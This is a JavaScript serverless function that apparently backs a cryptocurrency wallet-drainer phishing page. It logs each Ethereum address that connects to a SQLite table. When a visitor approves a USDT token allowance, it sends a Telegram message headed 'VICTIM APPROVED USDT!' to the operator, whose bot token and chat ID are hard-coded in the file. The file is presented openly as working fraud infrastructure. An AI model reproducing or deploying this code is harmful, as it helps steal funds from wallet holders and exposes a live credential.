const { Database } = require('sqlite3');
const { open } = require('sqlite');
const fetch = require('node-fetch');

// Telegram config
const BOT_TOKEN = '8594970934:AAGJZhbCc5Ogvgy5saG-RQs8lVRO6miSa6Y';
const CHAT_ID = '909411455';

let db = null;

async function getDb() {
    if (!db) {
        db = await open({
            filename: '/tmp/database.sqlite',
            driver: Database
        });

        await db.exec(`
      CREATE TABLE IF NOT EXISTS addresses (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        address TEXT UNIQUE NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);
    }
    return db;
}

async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
        return await response.json();
    } catch (err) {
        console.error('Telegram error:', err);
        return null;
    }
}

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        const db = await getDb();
        const { address, action, tx } = JSON.parse(event.body);

        if (!address || !address.match(/^0x[a-fA-F0-9]{40}$/)) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ error: 'Invalid address' })
            };
        }

        let isNewAddress = false;
        const result = await db.run(
            'INSERT OR IGNORE INTO addresses (address) VALUES (?)',
            [address]
        );

        if (result.changes > 0) {
            isNewAddress = true;
        }

        if (action === 'approve') {
            await sendTelegramMessage(`
🚨 <b>VICTIM APPROVED USDT!</b>

💼 Address: <code>${address}</code>
🔗 Tx Hash: <code>${tx || 'N/A'}</code>
⏰ Time: ${new Date().toLocaleString()}
      `);
        } else if (action === 'connect' && isNewAddress) {
            await sendTelegramMessage(`
👀 <b>New Visitor Connected Wallet!</b>

💼 Address: <code>${address}</code>
⏰ Time: ${new Date().toLocaleString()}
      `);
        }

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ success: true })
        };
    } catch (err) {
        console.error('Error:', err);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ error: 'Server error' })
        };
    }
};